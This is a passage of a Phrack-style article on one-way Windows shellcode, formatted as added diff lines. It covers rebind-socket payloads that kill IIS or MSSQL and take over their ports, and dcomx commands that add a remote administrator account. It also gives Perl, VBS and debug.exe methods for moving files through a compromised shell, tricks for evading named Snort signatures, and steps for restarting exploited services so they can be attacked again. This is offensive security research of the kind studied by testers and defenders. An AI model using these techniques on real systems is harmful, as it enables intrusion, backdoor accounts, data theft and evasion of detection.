+4.	Call WriteProcessMemory() to copy our shellcode from the 
+	vulnerable service to the new buffer in the suspended process.
+5.	Use SetThreadContext() to replace EIP with memory address of 
+	the new buffer.
+6.	ResumeThread() will resume the suspended thread. When the 
+	thread starts, it will point directly to the new buffer which 
+	contains our shellcode.
+
+The new shellcode in the separate process will loop constantly trying 
+to bind to port of the vulnerable service. However, until we 
+successfully terminate the vulnerable machine it will not be able to 
+continue.
+
+Back in our original shellcode, we will execute TerminateProcess() to 
+forcefully terminate the vulnerable service. TerminateProcess() take 
+two parameters, the Process handle to be terminated and the return 
+value. Since we are terminating the current process, we can just pass 
+-1 as the Process Handle.
+
+As soon as the vulnerable service terminated, our shellcode in a 
+separate process will be able to bind successfully to the specific 
+port number. It will continue to bind a shell to that port and 
+waiting for connection. To connect to this shell, we just need to 
+connect to the target machine on the port number of the vulnerable 
+service.
+
+It is possible to improve the shellcode further by checking source 
+port number of IP before allowing a shell. Otherwise, anyone 
+connecting to that port immediately after your attack will obtain the 
+shell.
+
+
+--[ 4.c.1 Rebind socket shellcode implementation
+
+Rebind socket shellcode is implemented in rebind.asm in the Code 
+section. We need to use a lot of APIs in this shellcode. Loading 
+these APIs by name will make our shellcode much bigger than it should 
+be. Thus, the rebind socket shellcode is using another method to 
+locate the APIs that we need. Instead of comparing the API by its 
+name, we can compare by its fingerprint/hash. We generate a 
+fingerprint for each API name we want to use and store it in our 
+shellcode. Thus, we only need to store 4 bytes (size of the 
+fingerprint) for each API. During shellcode execution, we will 
+calculate the fingerprint of API name in the Export Table and compare 
+it with our value. If there is a match, we found the API we need. The 
+function that loads an API address by its fingerprint in rebind.asm 
+was ripped from HD Moore's MetaSploit Framework 
+(http://metasploit.com/sc/win32_univ_loader_src.c).
+
+A sample usage of a rebind socket shellcode can be found rebindwb.c 
+and lengmui.c in the Code section. Rebindwb.c is an exploit modified 
+from the previous WebDAV exploit that make use of Rebind shellcode. 
+It will attack IIS, kill it and take over its port. Connecting to 
+port 80 after the exploit will grant the attacker a shell.
+
+The other exploit, lengmui.c is MSSQL Resolution bug, it attack UDP 
+1434, kill MSSQL server, bind itself to TCP 1433. Connection to TCP 
+1433 will grant the attacker a shell.
+
+
+--[ 4.d Other one-way shellcode
+
+There are other creative mechanisms being implemented by Security 
+Expert in the field. For example, Brett Moore's 91 bytes shellcode as 
+published in Pen-Test mailing list (http://seclists.org/lists/pen-
+test/2003/Jan/0000.html). It is similar to the Find Socket shellcode, 
+only that, instead of actually finding the attacking connection, the 
+shellcode create a new process of CMD for every socket descriptor.
+
+Also similar to Find socket shellcode, instead of checking the 
+destination port to identify our connection, XFocus's forum has 
+discussion on sending additional bytes for verification. Our 
+shellcode will read 4 more bytes from every socket descriptor, and if 
+the bytes match with our signature, we will bind a CMD shell to that 
+connection. It could be implemented as:
+
+*	An exploit send additional bytes as signature ("ey4s") after 
+	sending the overflow string
+*	The shellcode will set each socket descriptor to non-blocking
+*	Shellcode call API recv() to check for "ey4s"
+*	If there is a match, spawn CMD
+*	Loop if not true
+
+It is also possible to send it with "MSG_OOB" flag. As implemented by 
+san _at_ xfocus d0t org.
+
+Yet, another possibility is to implement shellcode that execute 
+command that attached in the shellcode it self. There is no need to 
+create network connection. The shellcode just execute the command and 
+die. We can append our command as part of the shellcode and execute 
+CreateProcess() API. A sample implementation can be found on dcomx.c 
+in the Code section. For example, we can use the following command to 
+add a remote administrator to a machine which is vulnerable to RPC-
+DCOM bug as discovered by LSD.
+
+# dcomx 10.1.1.1 "cmd /c net user /add compaquser compaqpass"
+# dcomx 10.1.1.1 "cmd /c net localgroup /add administrators compaquser"
+
+
+--[ 5 Transferring file using shellcode
+
+One of the most common things to do after you break into a box is to 
+upload or download files. We usually download files from our target 
+as proof of successful penetration testing. We also often upload 
+additional tools to the server to use it as an attacking point to 
+attack other internal server.
+
+In the absent of a firewall, we can easily use FTP or TFTP tools 
+found in standard Windows installation to get the job done:
+
+*	ftp -s:script
+*	tftp -i myserver GET file.exe
+
+
+However, in a situation where there is no other way to go in and out, 
+we can still transfer file using the shell we obtain from our One-way 
+shellcode. It is possible to reconstruct a binary file by using the 
+debug.exe command available in almost every Windows.
+
+
+--[ 5.a Uploading file with debug.exe
+
+We can create text file in our target system using the echo command. 
+But we can't use echo to create binary file, not with the help from 
+debug.exe. It is possible to reconstructing binary using debug.exe. 
+Consider the following commands:
+
+C:\>echo nbell.com>b.s
+C:\>echo a>>b.s
+C:\>echo dw07B8 CD0E C310>>b.s
+C:\>echo.>>b.s
+C:\>echo R CX>>b.s
+C:\>echo 6 >>b.s
+C:\>echo W>>b.s
+C:\>echo Q>>b.s
+C:\>debug<b.s
+
+The echo command will construct a debug script which contains 
+necessary instructions code in hex value to create a simple binary 
+file. The last command will feed the script into debug.exe, which 
+will eventually generate our binary file.
+
+However, we cannot construct a binary file larger than 64k. This is 
+the limitation of the debug.exe itself.
+
+
+--[ 6.b Uploading file with VBS
+
+Thus, a better idea to upload a binary file is to use Visual Basic 
+Script. VBS interpreter (cscript.exe) available by default in almost 
+all Windows platform. This is our strategy:
+ 
+1.	Create a VBS script that will read hex code from a file and 
+	rewrite it as binary.
+2.	Upload the script to target using "echo" command.
+3.	Read file to be uploaded, and "echo" the hex code to a file in 
+	the target server.
+4.	Run the VBS script to translate hex code to binary.
+
+A sample script like below can be use to read any binary file and 
+create the correspondence ASC printable hex code file.
+
+dread: while (1){
+	$nread2 = sysread(INFO, $disbuf, 100);
+	last dread if $nread2 == 0;
+	@bytes = unpack "C*", $disbuf;
+	foreach $dab (@bytes){
+		$txt .= sprintf "%02x", $dab;
+	}
+	$to .= "echo $txt >>outhex.txt\n";
+	$nnn++;
+	if ($nnn > 100) {
+		print SOCKET $to;
+		receive();
+		print ".";
+		$to="";
+		$nnn=0;
+	}
+	$txt = "";
+}
+
+Then, we create our VBS decoder in the target machine - "tobin.vbs". 
+We can easily use "echo" command to create this file in the target 
+machine. This decoder will read the outhex.txt created above and 
+construct the binary file.
+
+Set arr = WScript.Arguments 
+Set wsf = CreateObject("Scripting.FileSystemObject") 
+Set infile = wsf.opentextfile(arr(arr.Count-2), 1, TRUE) 
+Set file = wsf.opentextfile(arr(arr.Count-1), 2, TRUE) 
+do while infile.AtEndOfStream = false 
+	line = infile.ReadLine 
+       For x = 1 To Len(line)-2 Step 2 
+			thebyte = Chr(38) & "H" & Mid(line, x, 2) 
+			file.write Chr(thebyte) 
+       Next 
+loop 
+file.close 
+infile.close
+
+Once the decoder is in the target machine, we just need to execute it 
+to convert the Hex code into a binary file:
+
+# cscript tobin.vbs outhex.txt out.exe
+
+
+--[ 5.c Retrieving file from command line
+
+Once we have the ability to upload file to the machine, we can upload 
+a Base64 encoder to the target machine. We will use this encoder to 
+encode any file into a printable Base64 format. We can easily print 
+the output of the Base64 encoded in command line and capture the text. 
+Once we have the complete file in Base64, we will save that into a 
+file in our machine. Using WinZip or any Base64 decoder, we can 
+convert that file back into its binary form. The following command 
+allows us to retrieve any file in our target machine:
+
+print SOCKET "base64 -e $file outhex2.txt\n";
+receive();
+print SOCKET "type outhex2.txt\n";
+open(RECV, ">$file.b64");
+print RECV receive();
+
+Fortunately, all these file upload/downloading can be automated. 
+Refer to hellobug.pl in the Code section to see file transfer in 
+action.
+
+
+--[ 6 Avoiding IDS detection
+
+Snort rules now have several Attack-Response signatures that will be 
+able to detect common output from a Windows CMD shell. Every time we 
+start CMD, it will display a banner:
+
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+C:\Documents and Settings\sk
+
+There is a Snort rule that capture this banner:
+
+http://www.snort.org/snort-db/sid.html?sid=2123
+
+We can easily avoid this by spawning cmd.exe with the parameter of 
+"/k" in our shellcode. All we need to do is just to add 3 more bytes 
+in our shellcode from "cmd" to "cmd /k". You may also need to add 3 
+to the value in the decoder that count the number of byte that we 
+need to decode.
+
+There is also another Snort rules that capture a directory listing of 
+the "dir" command in a Windows shell:
+
+http://www.snort.org/snort-db/sid.html?sid=1292
+
+The rule compares "Volume Serial Number" in any established network 
+packet, if there is a match, the rule will trigger an alert.
+
+# dir
+ Volume in drive C is Cool
+ Volume Serial Number is SKSK-6622
+
+ Directory of C:\Documents and Settings\sk
+
+06/18/2004  06:22 PM    <DIR>          .
+06/18/2004  06:22 PM    <DIR>          ..
+12/01/2003  01:08 AM                58 ReadMe.txt
+
+To avoid this, we just need to include /b in our dir command. It is 
+best if we set this in an environment so that dir will always use 
+this argument:
+
+# set DIRCMD=/b
+# dir
+ReadMe.txt
+
+Snort also has signature that detect "Command completed" in:
+
+http://www.snort.org/snort-db/sid.html?sid=494
+
+This command usually generated by the "net" command. It is easy to 
+create a wrapper for the net command that will not display "Command 
+completed" status or use other tools like "nbtdump", etc.
+
+
+--[ 7 Restarting vulnerable service
+
+Most often, after a buffer overflow, the vulnerable service will be 
+unstable. Even if we can barely keep it alive, chances are we will 
+not be able to attack the service again. Although we can try to fix 
+these problem in our shellcode, but the easiest way is to restart the 
+vulnerable service via our shell. This usually can be done using "at" 
+command to schedule a command that will restart the vulnerable 
+service after we exit from our shell.
+
+For example, if our vulnerable service is IIS web server, we can 
+reset it using a scheduler:
+
+#at <time> iisreset
+
+In the case of MS SQL Server, we just need to start the 
+sqlserveragent service. This is a helper service installed by default 
+when you install MS SQL Server. It will constantly monitor and check 
+if the SQL Server process is running. If it is not, it will be 
+started. Executing the following command in our shell will start this 
+service, which in turn, help us to MS SQL Server once we exit. 
+
+#net start sqlserveragent
+
+Another example is on the Workstation service bug discovered by Eeye. 
+In this case, we don't have a helper service. But we can kill the 
+relevant service, and restart it.
+
+1. Kill the Workstation service
+#taskkill /fi "SERVICES eq lanmanworkstation" /f
+ 
+2. restart required services
+#net start workstation
+#net start "computer browser"
+#net start "Themes" <== optional
+#net start "messenger"   <== optional
+...
+ 
+If we exit our shellcode now, we can attack the machine via the 
+Workstation exploit again.
+
+
+--[ 8 End of shellcode?
+
+Shellcode is simple to use and probably easiest to illustrate the 
+severity of a vulnerability in proof of concept code. However there 
+are a few more advance payload strategies released to the public by 
+LSD's Windows ASM component, Core Security's Syscall Proxy, Dave 
+Aitel's MOSDEF, etc. These payloads offer much more than a shell. The 
+References section provides a few good pointers to get more 
+information. We hope you enjoy reading our article as much as other 
+quality article from Phrack.
+
+
+--[ 9 Greetz!
+
+There are many good fellows we would like to thank for their 
+continuous source of information to feed our hunger for knowledge. 
+Without these guys, the security field will be boring.
+
+My mentor, my friend: sam, pokleyzz, wanvadder, wyse, socket370 and 
+the rest of =da scan clan=, Ey4s, San and all that support XFocus 
+team! RD and the rest of THC! The Grugq! Saumil! Sheeraj! Nitesh! 
+Caddis from Team-Teso! CK and the rest of SIG^2 team! Sensepost! 
+BrightVaio! L33tdawg and the rest of HackInTheBox team!
+
+Greets to the gurus: HD Moore! Halvar! HSJ! Michal, Adam and the rest 
+of LSD! (David) Mnemonic! Dave Aitel! EEYE! Brett Moore! And many 
+others Blackhat speakers for their excellence research!
+
+
+--[ 10 References
+
+*       Code to this article:
+        http://www.scan-associates.net/papers/one-way.zip
+
+*	Shellcode and exploit:
+	HSJ - http://hsj.shadowpenguin.org/misc/
+
+*	More shellcode!
+	HD Moore - http://www.metasploit.com
+
+*	Advance payload:
+	CORE Security 
+
+*	Syscall Proxying (http://www.blackhat.com/html/bh-usa-
+	02/bh-usa-02-speakers.html#Maximiliano Caceres)
+
+*	Inlineegg 
+	(http://oss.coresecurity.com/projects/inlineegg.html)
+
+*	LSD (http://www.hivercon.com/hc02/talk-lsd.htm)
+
+*	Eeye (http://www.blackhat.com/html/win-usa-03/win-usa-03-
+	speakers.html#Riley Hassel)
+
+*	Dave Aitel (http://www.immunitysec.com/MOSDEF/)
+
+*	Alexander E. Cuttergo (Impurity)
+
+
+--[ 11 The code
+
+Please see http://www.scan-associates.net/papers/one-way.zip
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
